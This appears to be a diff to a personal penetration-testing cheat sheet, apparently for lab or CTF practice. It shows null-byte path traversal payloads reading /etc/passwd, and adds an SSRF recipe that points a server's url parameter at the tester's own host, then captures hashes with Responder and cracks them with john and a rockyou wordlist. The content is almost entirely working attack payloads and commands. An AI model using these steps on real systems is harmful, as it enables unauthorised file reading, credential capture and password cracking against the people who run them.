@@ -345,6 +345,16 @@ http://abc.so/file.php?file=photo.png%00          .. ok
 http://abc.so/file.php?file=file.php%00           .. ok 
 http://abc.so/file.php?file=/../../etc/passwd%00  .. win 
 
+=================================== 
+"Enter URL"
+
+Googleish-Search-Menu = SSRF
+http://192.168.200.5/?url=http://whatever.com
+http://192.168.200.5/?url=http://192.168.162.46/me
+python3 -m http.server 80
+sudo responder -I tun0 
+john responder.hash --wordlist=$rockyou  
+
 
 =================================== 
 Web Log Poison
